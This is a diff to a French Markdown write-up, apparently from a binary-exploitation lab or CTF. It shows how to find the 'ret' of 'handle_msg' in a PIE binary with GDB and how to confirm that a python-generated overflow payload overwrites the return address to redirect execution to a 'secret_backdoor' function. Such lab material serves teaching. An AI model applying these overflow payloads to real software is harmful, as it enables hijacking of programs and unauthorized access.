@@ -167,12 +167,29 @@ de le calculer soi-même depuis les tailles de champs.
 
 ## Vérification du payload en GDB
 
-Pour confirmer que le return address est bien écrasé avec la bonne valeur :
+### Trouver l'adresse du `ret` de handle_msg
+
+Comme pour `secret_backdoor`, le binaire est PIE : l'adresse réelle n'apparaît
+qu'**après avoir lancé** le programme. On désassemble `handle_msg` et on lit
+l'adresse de sa **dernière instruction** (`ret`) dans la colonne de gauche :
 
 ```
-(gdb) break *0x555555554931   # adresse du retq de handle_msg
+(gdb) break main
+(gdb) run                  # PIE résolu → adresses 0x5555... réelles
+(gdb) disas handle_msg
+   ...
+   0x0000555555554931 <+...>:   ret    ← l'adresse du ret = celle qu'on cherche
+```
+
+On pose le breakpoint **sur ce `ret`** : le programme s'arrête juste avant de
+sauter, donc `$rsp` pointe exactement sur la valeur qui sera chargée dans RIP.
+
+### Confirmer que le return address est bien écrasé
+
+```
+(gdb) break *0x555555554931   # adresse du ret trouvée ci-dessus
 (gdb) run < <(python -c "import sys; sys.stdout.write('A'*40 + '\xd0' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n')")
-(gdb) x/4gx $rsp              # inspecter ce qui sera chargé dans RIP
+(gdb) x/4gx $rsp              # inspecter ce qui sera chargé dans RIP → doit valoir 0x55555555488c
 ```
 
 ---
